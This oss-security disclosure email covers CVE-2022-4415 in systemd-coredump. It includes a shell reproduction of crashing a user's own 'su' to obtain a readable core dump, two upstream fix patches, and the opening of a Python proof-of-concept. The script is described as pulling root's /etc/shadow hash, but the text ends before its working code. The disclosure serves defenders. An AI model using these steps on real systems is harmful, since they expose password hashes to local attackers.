Received: (qmail 18119 invoked by uid 550); 21 Dec 2022 11:51:38 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 18101 invoked from network); 21 Dec 2022 11:51:38 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1671623486; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=fptA9uUzrwacKM/8uR0To624aLQLbFjw0T8aBb9JTRY=;
	b=WMaIOuwNgbILGLQ4neITrtSRm+Zi+UtuMpmZnYlQAIj9TeGxZKPdVaKpCoHO3U9SJxtDIy
	RtawSh/ejEyTIVobEUQyCyxDhU1+Twih6l6JWTA2+s3Xnd5II6wwyPImQO56fZhVEpCaHk
	M2+TBMSEq47XjqCHz8DujOCPWZglN/4=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1671623486;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=fptA9uUzrwacKM/8uR0To624aLQLbFjw0T8aBb9JTRY=;
	b=SHUTnkTJIe+u651NvKzaAXskEbK4me8lq99VlNw61xeNt3BbA63YwnKbhNVy/1TCGjOTdY
	thrRX0SKifk1MODw==
Date: Wed, 21 Dec 2022 12:51:24 +0100
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <Y6LzPfbOPm8WE5St@kasco.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="tgjPVuxSyQ9yFDFe"
Content-Disposition: inline
Subject: [oss-security] systemd-coredump: CVE-2022-4415: local information leak due to
 systemd-coredump not respecting fs.suid_dumpable kernel setting

--tgjPVuxSyQ9yFDFe
Content-Type: multipart/mixed; protected-headers=v1;
	boundary="3RUAHq2EPah6bw+m"
Content-Disposition: inline
Date: Wed, 21 Dec 2022 12:51:24 +0100
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Subject: systemd-coredump: CVE-2022-4415: local information leak due to
 systemd-coredump not respecting fs.suid_dumpable kernel setting


--3RUAHq2EPah6bw+m
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello list,

this is the publication of a report that was privately shared with the
linux-distros mailing list on 2022-12-09 with a communicated coordinated
release date of 2022-12-20.

I made small changes to the report to reflect recent developments.

This report is about a security issue I found in systemd-coredump.
systemd-coredump is a userspace coredump handler for Linux that is part
of the systemd suite [1].

[1]: https://github.com/systemd/systemd

The Issue
=3D=3D=3D=3D=3D=3D=3D=3D=3D

systemd-coredump sets the sysctl fs.suid_dumpable by default to 2 via
a sysctl.d drop-in configuration file. For the kernel's builtin coredump
handling this setting means that core dumps for setuid (or otherwise
privileged) processes will be written to disk but will only be
accessible to the root user to avoid sensitive data leaking to
unprivileged user accounts. See also `man 5 proc` for the full
documentation of this sysctl.

systemd-coredump in userspace, however, does not respect this kernel
setting in the implementation of its coredump handling. The real user ID
of a dumping process will receive read access to the core dump via an
ACL entry:

    someuser$ cat /proc/sys/kernel/core_pattern
    |/usr/lib/systemd/systemd-coredump %P %u %g %s %t %c %h
    someuser$ cat /cat /proc/sys/fs/suid_dumpable
    2
    someuser$ /usr/bin/su # run a setuid-root program and keep it running
    Password:
=20=20=20=20
    # in another shell trigger a SEGFAULT in the setuid-root program
    someuser$ kill -s SIGSEGV `pidof su`
=20=20=20=20
    # back in the original shell
    Password: Segmentation fault (core dumped)
    someuser$ cd /var/lib/systemd/coredump
    someuser$ ls -l
    -rw-r-----+ 1 root root 90K Okt 20 11:59 core.su.1000.76f0e40af2a240d98=
e50b90ab141d974.3529.1666259998000000.zst
    someuser$ getfacl core.su.*
    # file:
    # core.su.1000.76f0e40af2a240d98e50b90ab141d974.3529.1666259998000000.z=
st
    # owner: root
    # group: root
    user::rw-
    user:someuser:r--
    group::r--
    mask::r--
    other::---

I have reproduced this on openSUSE Tumbleweed with systemd version 251.
I have been able to reproduce it also on other current Linux
distributions like Arch, Debian, Fedora and SLES.

Patch and Workaround
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Attached are the current (two) patches I received from systemd upstream.
Upstream published the fix by now in their GitHub repository [2].

A simple workaround without patching systemd-coredump is to revert the
sysctl setting of fs.suid_dumpable back to 0. In this mode the kernel
will not invoke systemd-coredump for privileged programs. The issue will
thus not be triggered.

[2]: https://github.com/systemd/systemd/commit/b7641425659243c09473cd8fb3ae=
f2c0d4a3eb9c

Affected Versions
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The vulnerable default of the fs.suid_dumpable sysctl has been present
since systemd version 246 (introduced via commit 6635f57d3ee). Even
older versions may be affected though, should a system administrator
decide to change this setting to 2.

Upstream states that only systemd starting with version 247 are
affected, I don't know how they come to this different conclusion.

Upstream also states that only builds of systemd with libacl support are
affected. This makes sense since the read access to the core dumps is
granted via ACL entries and there is no fallback to this.

Exploit and Severity
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Exploiting this issue is pretty simple at the outset. Regular users are
allowed to send arbitrary signals to privileged processes they create.
Thus the privileged processes can be forced to dump core at arbitrary
points in time and the memory contents of the program will become
accessible via systemd-coredump.

Whether data obtained this way allows for a relevant information leak
depends on the timing, on the one hand, and on the type of program
executed on the other hand. What comes to mind is attempting to obtain
the password hash for the root user account that is stored in
/etc/shadow. Tools like 'su' and 'sudo' will have to process these
password hashes when authenticating the invoking user.

With 'sudo' this will not work, because it actively sets the ulimit for
coredumps to 0. The reason for this is to protect against exactly this
attack scenario [3].

With 'su' it works, however. Attached you can find a Python script I
created that shows that it is relatively simple to obtain the root
user's hash digest from /etc/shadow. From here on an attacker can
attempt to crack the hash using a GPU rig, for example. While it is not
a simple local root exploit it can be one if there is a dedicated
attacker.

Other setuid programs (or also programs running only with certain raised
Linux capabilties) could allow for different kinds of information leaks.
Even for 'su' it depends a lot on the PAM stack configuration. Some PAM
modules might read in data from private files in the target user's home
directory, or private configuration files which could leak via
systemd-coredump.

[3]: https://github.com/sudo-project/sudo/blob/3040bf54c99ed1baa9e7006be2fe=
d3d5fa71f80e/docs/sudo.man.in#L1260

Timeline
=3D=3D=3D=3D=3D=3D=3D=3D

2022-10-20: I sent a first report and some questions to
            systemd-security@redhat.com, offering coordinated disclosure.
2022-11-28: Communication did not progress much; I investigated the issue
            further by creating a PoC. Upstream confirmed the issue now and
            acknowledged a higher severity than initially considered.
2022-12-09: The final patches have been shared with us and we agreed to
            the CRD 2022-20-20. I shared the report with the
	    linux-distros mailing list.
2022-12-12: The CVE assignment was communicated by upstream and I also
            shared it with the linux-distros mailing list.
2022-12-20: Upstream published the fix.

Regards

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Security Engineer
https://www.suse.com/security
GPG Key ID: 0x14C405C971923553
=20
SUSE Software Solutions Germany GmbH
HRB 36809, AG N=FCrnberg
Gesch=E4ftsf=FChrer: Ivo Totev, Andrew Myers, Andrew McDonald, Boudien Moer=
man

--3RUAHq2EPah6bw+m
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment;
	filename="0001-coredump-adjust-whitespace.patch"
Content-Transfer-Encoding: quoted-printable

=46rom 510a146634f3e095b34e2a26023b1b1f99dcb8c0 Mon Sep 17 00:00:00 2001
From: =3D?UTF-8?q?Zbigniew=3D20J=3DC4=3D99drzejewski-Szmek?=3D <zbyszek@in.=
waw.pl>
Date: Tue, 29 Nov 2022 09:00:16 +0100
Subject: [PATCH 1/2] coredump: adjust whitespace

---
 src/coredump/coredump.c | 56 ++++++++++++++++++++---------------------
 1 file changed, 28 insertions(+), 28 deletions(-)

diff --git a/src/coredump/coredump.c b/src/coredump/coredump.c
index 50220c5ec7..9ce2b92ded 100644
--- a/src/coredump/coredump.c
+++ b/src/coredump/coredump.c
@@ -111,16 +111,16 @@ enum {
 };
=20
 static const char * const meta_field_names[_META_MAX] =3D {
-        [META_ARGV_PID]          =3D "COREDUMP_PID=3D",
-        [META_ARGV_UID]          =3D "COREDUMP_UID=3D",
-        [META_ARGV_GID]          =3D "COREDUMP_GID=3D",
-        [META_ARGV_SIGNAL]       =3D "COREDUMP_SIGNAL=3D",
-        [META_ARGV_TIMESTAMP]    =3D "COREDUMP_TIMESTAMP=3D",
-        [META_ARGV_RLIMIT]       =3D "COREDUMP_RLIMIT=3D",
-        [META_ARGV_HOSTNAME]     =3D "COREDUMP_HOSTNAME=3D",
-        [META_COMM]              =3D "COREDUMP_COMM=3D",
-        [META_EXE]               =3D "COREDUMP_EXE=3D",
-        [META_UNIT]              =3D "COREDUMP_UNIT=3D",
+        [META_ARGV_PID]       =3D "COREDUMP_PID=3D",
+        [META_ARGV_UID]       =3D "COREDUMP_UID=3D",
+        [META_ARGV_GID]       =3D "COREDUMP_GID=3D",
+        [META_ARGV_SIGNAL]    =3D "COREDUMP_SIGNAL=3D",
+        [META_ARGV_TIMESTAMP] =3D "COREDUMP_TIMESTAMP=3D",
+        [META_ARGV_RLIMIT]    =3D "COREDUMP_RLIMIT=3D",
+        [META_ARGV_HOSTNAME]  =3D "COREDUMP_HOSTNAME=3D",
+        [META_COMM]           =3D "COREDUMP_COMM=3D",
+        [META_EXE]            =3D "COREDUMP_EXE=3D",
+        [META_UNIT]           =3D "COREDUMP_UNIT=3D",
 };
=20
 typedef struct Context {
@@ -139,9 +139,9 @@ typedef enum CoredumpStorage {
 } CoredumpStorage;
=20
 static const char* const coredump_storage_table[_COREDUMP_STORAGE_MAX] =3D=
 {
-        [COREDUMP_STORAGE_NONE] =3D "none",
+        [COREDUMP_STORAGE_NONE]     =3D "none",
         [COREDUMP_STORAGE_EXTERNAL] =3D "external",
-        [COREDUMP_STORAGE_JOURNAL] =3D "journal",
+        [COREDUMP_STORAGE_JOURNAL]  =3D "journal",
 };
=20
 DEFINE_PRIVATE_STRING_TABLE_LOOKUP(coredump_storage, CoredumpStorage);
@@ -157,13 +157,13 @@ static uint64_t arg_max_use =3D UINT64_MAX;
=20
 static int parse_config(void) {
         static const ConfigTableItem items[] =3D {
-                { "Coredump", "Storage",          config_parse_coredump_st=
orage,           0, &arg_storage           },
-                { "Coredump", "Compress",         config_parse_bool,      =
                 0, &arg_compress          },
-                { "Coredump", "ProcessSizeMax",   config_parse_iec_uint64,=
                 0, &arg_process_size_max  },
-                { "Coredump", "ExternalSizeMax",  config_parse_iec_uint64_=
infinity,        0, &arg_external_size_max },
-                { "Coredump", "JournalSizeMax",   config_parse_iec_size,  =
                 0, &arg_journal_size_max  },
-                { "Coredump", "KeepFree",         config_parse_iec_uint64,=
                 0, &arg_keep_free         },
-                { "Coredump", "MaxUse",           config_parse_iec_uint64,=
                 0, &arg_max_use           },
+                { "Coredump", "Storage",          config_parse_coredump_st=
orage,     0, &arg_storage           },
+                { "Coredump", "Compress",         config_parse_bool,      =
           0, &arg_compress          },
+                { "Coredump", "ProcessSizeMax",   config_parse_iec_uint64,=
           0, &arg_process_size_max  },
+                { "Coredump", "ExternalSizeMax",  config_parse_iec_uint64_=
infinity,  0, &arg_external_size_max },
+                { "Coredump", "JournalSizeMax",   config_parse_iec_size,  =
           0, &arg_journal_size_max  },
+                { "Coredump", "KeepFree",         config_parse_iec_uint64,=
           0, &arg_keep_free         },
+                { "Coredump", "MaxUse",           config_parse_iec_uint64,=
           0, &arg_max_use           },
                 {}
         };
=20
@@ -209,15 +209,15 @@ static int fix_acl(int fd, uid_t uid) {
 static int fix_xattr(int fd, const Context *context) {
=20
         static const char * const xattrs[_META_MAX] =3D {
-                [META_ARGV_PID]          =3D "user.coredump.pid",
-                [META_ARGV_UID]          =3D "user.coredump.uid",
-                [META_ARGV_GID]          =3D "user.coredump.gid",
-                [META_ARGV_SIGNAL]       =3D "user.coredump.signal",
-                [META_ARGV_TIMESTAMP]    =3D "user.coredump.timestamp",
-                [META_ARGV_RLIMIT]       =3D "user.coredump.rlimit",
-                [META_ARGV_HOSTNAME]     =3D "user.coredump.hostname",
-                [META_COMM]              =3D "user.coredump.comm",
-                [META_EXE]               =3D "user.coredump.exe",
+                [META_ARGV_PID]       =3D "user.coredump.pid",
+                [META_ARGV_UID]       =3D "user.coredump.uid",
+                [META_ARGV_GID]       =3D "user.coredump.gid",
+                [META_ARGV_SIGNAL]    =3D "user.coredump.signal",
+                [META_ARGV_TIMESTAMP] =3D "user.coredump.timestamp",
+                [META_ARGV_RLIMIT]    =3D "user.coredump.rlimit",
+                [META_ARGV_HOSTNAME]  =3D "user.coredump.hostname",
+                [META_COMM]           =3D "user.coredump.comm",
+                [META_EXE]            =3D "user.coredump.exe",
         };
=20
         int r =3D 0;
--=20
2.38.1


--3RUAHq2EPah6bw+m
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment;
	filename="0002-coredump-do-not-allow-user-to-access-coredumps-with-.patch"
Content-Transfer-Encoding: quoted-printable

=46rom 3e4d0f6cf99f8677edd6a237382a65bfe758de03 Mon Sep 17 00:00:00 2001
From: =3D?UTF-8?q?Zbigniew=3D20J=3DC4=3D99drzejewski-Szmek?=3D <zbyszek@in.=
waw.pl>
Date: Mon, 28 Nov 2022 12:12:55 +0100
Subject: [PATCH 2/2] coredump: do not allow user to access coredumps with
 changed uid/gid/capabilities

When the user starts a program which elevates its permissions via setuid,
setgid, or capabilities set on the file, it may access additional informati=
on
which would then be visible in the coredump. We shouldn't make the the core=
dump
visible to the user in such cases.

Reported-by: Matthias Gerstner <mgerstner@suse.de>

This reads the /proc/<pid>/auxv file and attaches it to the process metadat=
a as
PROC_AUXV. Before the coredump is submitted, it is parsed and if either
at_secure was set (which the kernel will do for processes that are setuid,
setgid, or setcap), or if the effective uid/gid don't match uid/gid, the fi=
le
is not made accessible to the user. If we can't access this data, we assume=
 the
file should not be made accessible either. In principle we could also access
the auxv data from a note in the core file, but that is much more complex a=
nd
it seems better to use the stand-alone file that is provided by the kernel.

Attaching auxv is both convient for this patch (because this way it's passed
between the stages along with other fields), but I think it makes sense to =
save
it in general.

We use the information early in the core file to figure out if the program =
was
32-bit or 64-bit and its endianness. This way we don't need heuristics to g=
uess
whether the format of the auxv structure. This test might reject some cases=
 on
fringe architecutes. But the impact would be limited: we just won't grant t=
he
user permissions to view the coredump file. If people report that we're mis=
sing
some cases, we can always enhance this to support more architectures.

I tested auxv parsing on amd64, 32-bit program on amd64, arm64, arm32, and
ppc64el, but not the whole coredump handling.
---
 src/basic/io-util.h     |   9 ++
 src/coredump/coredump.c | 200 +++++++++++++++++++++++++++++++++++++---
 2 files changed, 194 insertions(+), 15 deletions(-)

diff --git a/src/basic/io-util.h b/src/basic/io-util.h
index 39728e06bc..3afb134266 100644
--- a/src/basic/io-util.h
+++ b/src/basic/io-util.h
@@ -91,7 +91,16 @@ struct iovec_wrapper *iovw_new(void);
 struct iovec_wrapper *iovw_free(struct iovec_wrapper *iovw);
 struct iovec_wrapper *iovw_free_free(struct iovec_wrapper *iovw);
 void iovw_free_contents(struct iovec_wrapper *iovw, bool free_vectors);
+
 int iovw_put(struct iovec_wrapper *iovw, void *data, size_t len);
+static inline int iovw_consume(struct iovec_wrapper *iovw, void *data, siz=
e_t len) {
+        /* Move data into iovw or free on error */
+        int r =3D iovw_put(iovw, data, len);
+        if (r < 0)
+                free(data);
+        return r;
+}
+
 int iovw_put_string_field(struct iovec_wrapper *iovw, const char *field, c=
onst char *value);
 int iovw_put_string_field_free(struct iovec_wrapper *iovw, const char *fie=
ld, char *value);
 void iovw_rebase(struct iovec_wrapper *iovw, char *old, char *new);
diff --git a/src/coredump/coredump.c b/src/coredump/coredump.c
index 9ce2b92ded..b6f3a2f256 100644
--- a/src/coredump/coredump.c
+++ b/src/coredump/coredump.c
@@ -4,6 +4,7 @@
 #include <stdio.h>
 #include <sys/prctl.h>
 #include <sys/statvfs.h>
+#include <sys/auxv.h>
 #include <sys/xattr.h>
 #include <unistd.h>
=20
@@ -107,6 +108,7 @@ enum {
=20
         META_EXE =3D _META_MANDATORY_MAX,
         META_UNIT,
+        META_PROC_AUXV,
         _META_MAX
 };
=20
@@ -121,10 +123,12 @@ static const char * const meta_field_names[_META_MAX]=
 =3D {
         [META_COMM]           =3D "COREDUMP_COMM=3D",
         [META_EXE]            =3D "COREDUMP_EXE=3D",
         [META_UNIT]           =3D "COREDUMP_UNIT=3D",
+        [META_PROC_AUXV]      =3D "COREDUMP_PROC_AUXV=3D",
 };
=20
 typedef struct Context {
         const char *meta[_META_MAX];
+        size_t meta_size[_META_MAX];
         pid_t pid;
         bool is_pid1;
         bool is_journald;
@@ -186,14 +190,17 @@ static uint64_t storage_size_max(void) {
         return 0;
 }
=20
-static int fix_acl(int fd, uid_t uid) {
-
-#if HAVE_ACL
-        int r;
-
+static int fix_acl(int fd, uid_t uid, bool allow_user) {
         assert(fd >=3D 0);
         assert(uid_is_valid(uid));
=20
+#if HAVE_ACL
+        int r;
+
+        /* We don't allow users to read coredumps if the uid or capabiliti=
es were changed. */
+        if (!allow_user)
+                return 0;
+
         if (uid_is_system(uid) || uid_is_dynamic(uid) || uid =3D=3D UID_NO=
BODY)
                 return 0;
=20
@@ -252,7 +259,8 @@ static int fix_permissions(
                 const char *filename,
                 const char *target,
                 const Context *context,
-                uid_t uid) {
+                uid_t uid,
+                bool allow_user) {
=20
         int r;
=20
@@ -262,7 +270,7 @@ static int fix_permissions(
=20
         /* Ignore errors on these */
         (void) fchmod(fd, 0640);
-        (void) fix_acl(fd, uid);
+        (void) fix_acl(fd, uid, allow_user);
         (void) fix_xattr(fd, context);
=20
         r =3D fsync_full(fd);
@@ -332,6 +340,153 @@ static int make_filename(const Context *context, char=
 **ret) {
         return 0;
 }
=20
+static int parse_auxv64(
+                const uint64_t *auxv,
+                size_t size_bytes,
+                int *at_secure,
+                uid_t *uid,
+                uid_t *euid,
+                gid_t *gid,
+                gid_t *egid) {
+
+        assert(auxv || size_bytes =3D=3D 0);
+
+        if (size_bytes % (2 * sizeof(uint64_t)) !=3D 0)
+                return log_warning_errno(SYNTHETIC_ERRNO(EIO), "Incomplete=
 auxv structure (%zu bytes).", size_bytes);
+
+        size_t words =3D size_bytes / sizeof(uint64_t);
+
+        /* Note that we set output variables even on error. */
+
+        for (size_t i =3D 0; i + 1 < words; i +=3D 2)
+                switch (auxv[i]) {
+                case AT_SECURE:
+                        *at_secure =3D auxv[i + 1] !=3D 0;
+                        break;
+                case AT_UID:
+                        *uid =3D auxv[i + 1];
+                        break;
+                case AT_EUID:
+                        *euid =3D auxv[i + 1];
+                        break;
+                case AT_GID:
+                        *gid =3D auxv[i + 1];
+                        break;
+                case AT_EGID:
+                        *egid =3D auxv[i + 1];
+                        break;
+                case AT_NULL:
+                        if (auxv[i + 1] !=3D 0)
+                                goto error;
+                        return 0;
+                }
+ error:
+        return log_warning_errno(SYNTHETIC_ERRNO(ENODATA),
+                                 "AT_NULL terminator not found, cannot par=
se auxv structure.");
+}
+
+static int parse_auxv32(
+                const uint32_t *auxv,
+                size_t size_bytes,
+                int *at_secure,
+                uid_t *uid,
+                uid_t *euid,
+                gid_t *gid,
+                gid_t *egid) {
+
+        assert(auxv || size_bytes =3D=3D 0);
+
+        size_t words =3D size_bytes / sizeof(uint32_t);
+
+        if (size_bytes % (2 * sizeof(uint32_t)) !=3D 0)
+                return log_warning_errno(SYNTHETIC_ERRNO(EIO), "Incomplete=
 auxv structure (%zu bytes).", size_bytes);
+
+        /* Note that we set output variables even on error. */
+
+        for (size_t i =3D 0; i + 1 < words; i +=3D 2)
+                switch (auxv[i]) {
+                case AT_SECURE:
+                        *at_secure =3D auxv[i + 1] !=3D 0;
+                        break;
+                case AT_UID:
+                        *uid =3D auxv[i + 1];
+                        break;
+                case AT_EUID:
+                        *euid =3D auxv[i + 1];
+                        break;
+                case AT_GID:
+                        *gid =3D auxv[i + 1];
+                        break;
+                case AT_EGID:
+                        *egid =3D auxv[i + 1];
+                        break;
+                case AT_NULL:
+                        if (auxv[i + 1] !=3D 0)
+                                goto error;
+                        return 0;
+                }
+ error:
+        return log_warning_errno(SYNTHETIC_ERRNO(ENODATA),
+                                 "AT_NULL terminator not found, cannot par=
se auxv structure.");
+}
+
+static int grant_user_access(int core_fd, const Context *context) {
+        int at_secure =3D -1;
+        uid_t uid =3D UID_INVALID, euid =3D UID_INVALID;
+        uid_t gid =3D GID_INVALID, egid =3D GID_INVALID;
+        int r;
+
+        assert(core_fd >=3D 0);
+        assert(context);
+
+        if (!context->meta[META_PROC_AUXV])
+                return log_warning_errno(SYNTHETIC_ERRNO(ENODATA), "No aux=
v data, not adjusting permissions.");
+
+        uint8_t elf[EI_NIDENT];
+        errno =3D 0;
+        if (pread(core_fd, &elf, sizeof(elf), 0) !=3D sizeof(elf))
+                return log_warning_errno(errno_or_else(EIO),
+                                         "Failed to pread from coredump fd=
: %s", STRERROR_OR_EOF(errno));
+
+        if (elf[EI_MAG0] !=3D ELFMAG0 ||
+            elf[EI_MAG1] !=3D ELFMAG1 ||
+            elf[EI_MAG2] !=3D ELFMAG2 ||
+            elf[EI_MAG3] !=3D ELFMAG3 ||
+            elf[EI_VERSION] !=3D EV_CURRENT)
+                return log_info_errno(SYNTHETIC_ERRNO(EUCLEAN),
+                                      "Core file does not have ELF header,=
 not adjusting permissions.");
+        if (!IN_SET(elf[EI_CLASS], ELFCLASS32, ELFCLASS64) ||
+            !IN_SET(elf[EI_DATA], ELFDATA2LSB, ELFDATA2MSB))
+                return log_info_errno(SYNTHETIC_ERRNO(EUCLEAN),
+                                      "Core file has strange ELF class, no=
t adjusting permissions.");
+
+        if ((elf[EI_DATA] =3D=3D ELFDATA2LSB) !=3D (__BYTE_ORDER =3D=3D __=
LITTLE_ENDIAN))
+                return log_info_errno(SYNTHETIC_ERRNO(EUCLEAN),
+                                      "Core file has non-native endianness=
, not adjusting permissions.");
+
+        if (elf[EI_CLASS] =3D=3D ELFCLASS64)
+                r =3D parse_auxv64((const uint64_t*) context->meta[META_PR=
OC_AUXV],
+                                 context->meta_size[META_PROC_AUXV],
+                                 &at_secure, &uid, &euid, &gid, &egid);
+        else
+                r =3D parse_auxv32((const uint32_t*) context->meta[META_PR=
OC_AUXV],
+                                 context->meta_size[META_PROC_AUXV],
+                                 &at_secure, &uid, &euid, &gid, &egid);
+        if (r < 0)
+                return r;
+
+        /* We allow access if we got all the data and at_secure is not set=
 and
+         * the uid/gid matches euid/egid. */
+        bool ret =3D
+                at_secure =3D=3D 0 &&
+                uid !=3D UID_INVALID && euid !=3D UID_INVALID && uid =3D=
=3D euid &&
+                gid !=3D GID_INVALID && egid !=3D GID_INVALID && gid =3D=
=3D egid;
+        log_debug("Will %s access (uid=3D"UID_FMT " euid=3D"UID_FMT " gid=
=3D"GID_FMT " egid=3D"GID_FMT " at_secure=3D%s)",
+                  ret ? "permit" : "restrict",
+                  uid, euid, gid, egid, yes_no(at_secure));
+        return ret;
+}
+
 static int save_external_coredump(
                 const Context *context,
                 int input_fd,
@@ -454,6 +609,8 @@ static int save_external_coredump(
                                 context->meta[META_ARGV_PID], context->met=
a[META_COMM]);
         truncated =3D r =3D=3D 1;
=20
+        bool allow_user =3D grant_user_access(fd, context) > 0;
+
 #if HAVE_COMPRESSION
         if (arg_compress) {
                 _cleanup_(unlink_and_freep) char *tmp_compressed =3D NULL;
@@ -491,7 +648,7 @@ static int save_external_coredump(
                         uncompressed_size +=3D partial_uncompressed_size;
                 }
=20
-                r =3D fix_permissions(fd_compressed, tmp_compressed, fn_co=
mpressed, context, uid);
+                r =3D fix_permissions(fd_compressed, tmp_compressed, fn_co=
mpressed, context, uid, allow_user);
                 if (r < 0)
                         return r;
=20
@@ -518,7 +675,7 @@ static int save_external_coredump(
                            "SIZE_LIMIT=3D%"PRIu64, max_size,
                            "MESSAGE_ID=3D" SD_MESSAGE_TRUNCATED_CORE_STR);
=20
-        r =3D fix_permissions(fd, tmp, fn, context, uid);
+        r =3D fix_permissions(fd, tmp, fn, context, uid, allow_user);
         if (r < 0)
                 return log_error_errno(r, "Failed to fix permissions and f=
inalize coredump %s into %s: %m", coredump_tmpfile_name(tmp), fn);
=20
@@ -766,7 +923,7 @@ static int change_uid_gid(const Context *context) {
 }
=20
 static int submit_coredump(
-                Context *context,
+                const Context *context,
                 struct iovec_wrapper *iovw,
                 int input_fd) {
=20
@@ -945,16 +1102,15 @@ static int save_context(Context *context, const stru=
ct iovec_wrapper *iovw) {
                 struct iovec *iovec =3D iovw->iovec + n;
=20
                 for (size_t i =3D 0; i < ELEMENTSOF(meta_field_names); i++=
) {
-                        char *p;
-
                         /* Note that these strings are NUL terminated, bec=
ause we made sure that a
                          * trailing NUL byte is in the buffer, though not =
included in the iov_len
                          * count (see process_socket() and gather_pid_meta=
data_*()) */
                         assert(((char*) iovec->iov_base)[iovec->iov_len] =
=3D=3D 0);
=20
-                        p =3D startswith(iovec->iov_base, meta_field_names=
[i]);
+                        const char *p =3D startswith(iovec->iov_base, meta=
_field_names[i]);
                         if (p) {
                                 context->meta[i] =3D p;
+                                context->meta_size[i] =3D iovec->iov_len -=
 strlen(meta_field_names[i]);
                                 break;
                         }
                 }
@@ -1191,6 +1347,7 @@ static int gather_pid_metadata(struct iovec_wrapper *=
iovw, Context *context) {
         uid_t owner_uid;
         pid_t pid;
         char *t;
+        size_t size;
         const char *p;
         int r;
=20
@@ -1255,13 +1412,26 @@ static int gather_pid_metadata(struct iovec_wrapper=
 *iovw, Context *context) {
                 (void) iovw_put_string_field_free(iovw, "COREDUMP_PROC_LIM=
ITS=3D", t);
=20
         p =3D procfs_file_alloca(pid, "cgroup");
-        if (read_full_virtual_file(p, &t, NULL) >=3D0)
+        if (read_full_virtual_file(p, &t, NULL) >=3D 0)
                 (void) iovw_put_string_field_free(iovw, "COREDUMP_PROC_CGR=
OUP=3D", t);
=20
         p =3D procfs_file_alloca(pid, "mountinfo");
-        if (read_full_virtual_file(p, &t, NULL) >=3D0)
+        if (read_full_virtual_file(p, &t, NULL) >=3D 0)
                 (void) iovw_put_string_field_free(iovw, "COREDUMP_PROC_MOU=
NTINFO=3D", t);
=20
+        /* We attach /proc/auxv here. ELF coredumps also contain a note fo=
r this (NT_AUXV), see elf(5). */
+        p =3D procfs_file_alloca(pid, "auxv");
+        if (read_full_virtual_file(p, &t, &size) >=3D 0) {
+                char *buf =3D malloc(strlen("COREDUMP_PROC_AUXV=3D") + siz=
e + 1);
+                if (buf) {
+                        /* Add a dummy terminator to make save_context() h=
appy. */
+                        *((uint8_t*) mempcpy(stpcpy(buf, "COREDUMP_PROC_AU=
XV=3D"), t, size)) =3D '\0';
+                        (void) iovw_consume(iovw, buf, size + strlen("CORE=
DUMP_PROC_AUXV=3D"));
+                }
+
+                free(t);
+        }
+
         if (get_process_cwd(pid, &t) >=3D 0)
                 (void) iovw_put_string_field_free(iovw, "COREDUMP_CWD=3D",=
 t);
=20
--=20
2.38.1


--3RUAHq2EPah6bw+m
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="su_core_shadow_extract.py"

#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner@suse.de>
# Date: 2022-11-17

# This script demonstrates the basic exploitation of systemd-coredump not
# protecting coredumps of setuid-root binaries correctly. systemd-coredump
# grants read access to the real user ID of privileged programs. This means an
# unprivileged user can read core dumps of setuid-programs of its own
# creation e.g. of the su program.
#
# Sending signals to one's own setuid-root programs is allowed, thus it is no
# problem to forcibly generate core dumps. The attacker only needs to find a
# lucky spot in time when the core dump contains sensitive data.
#
# The attack does not work for 'sudo', because sudo takes precautions to set
# the coredump ulimit to zero, for historical security reasons (also see
# sudo's man page about that).
#
# It does work with 'su', however, and we can obtain the shadow hash entry
# for the 'su' target user, i.e. 'root' by default. With this information
# the attacker could attempt cracking the hash with appropriate tools (this can
# still prove to be difficult or even impossible).

# To run this script you need:
#
# - The util-linux package (contains su)
# - a typical PAM stack installation using pam_unix in the auth group
# - the root user must have a password set (not the case on Ubuntu by default,
#   for example). Otherwise there is no hash to check and thus also no hash to
#   leak.
# - the gdb GNU debugger
# - debugging symbols for glibc, su (typically util-linux-debuginfo), PAM
#   (typically pam-debuginfo or libpam...-debuginfo) and maybe pam_unix (if
#   separate)
# - as it looks like using debuginfod for debug symbols doesn't work well
#   currently with gdb's batch mode that is used in this script
# - systemd-coredump must be installed and active

# NOTE: on some systems an unprivileged user cannot list its own coredumps
# because of missing journal access permissions. For demonstration purposes
# you can add the user to the systemd-journal group to get past this. In
# reality this is no limitation of the exploit, because the read permission on
# /var/lib/systemd/coredump/* is still granted. It only complicates things a
# bit, because the script would need to access the core files there directly
# instead of going through the coredumpctl interface.

# This PoC will run 'su' and kill it repeatedly with increasing sleep delays
# until the most recent core dump contains a promising backtrace. On a match
# gdb will be invoked and an attempt is made to present the shadow hash entry
# of the target user (root by default).

# In a real world system with a more complex PAM stack other sensitive data
# might be in reach e.g. private data opened from target user home directories
# or other system wide but private management data that a PAM module maintains
# in /var.

import shutil
import signal
import subprocess
import sys
import tempfile
import time

# this runs 'su' and forces it to dump core after the given sleep delay in seconds
def run_and_dump(sleeptime):
